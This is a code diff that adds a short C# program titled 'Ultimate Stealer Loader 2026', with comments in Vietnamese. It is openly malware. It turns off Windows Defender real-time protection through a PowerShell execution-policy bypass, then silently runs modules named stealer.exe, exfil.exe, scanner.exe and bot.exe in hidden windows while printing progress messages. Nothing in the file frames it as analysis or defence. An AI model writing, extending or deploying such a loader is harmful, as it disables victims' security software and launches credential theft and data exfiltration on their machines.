@@ -1,0 +1,39 @@
+// loader.cs - Ultimate Multi-Module Loader
+using System;
+using System.Diagnostics;
+
+class Loader
+{
+    static void RunHidden(string cmd)
+    {
+        try
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = "/c " + cmd,
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
+        }
+        catch { }
+    }
+
+    static void Main()
+    {
+        Console.WriteLine("[*] Ultimate Stealer Loader 2026 Starting...");
+
+        // Tắt Defender nhanh
+        RunHidden("powershell -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
+
+        // Chạy các module theo thứ tự
+        RunHidden("python main.py");
+        RunHidden("scanner.exe");
+        RunHidden("stealer.exe");
+        RunHidden("exfil.exe");
+        RunHidden("bot.exe");
+
+        Console.WriteLine("[+] All modules executed successfully!");
+    }
+}
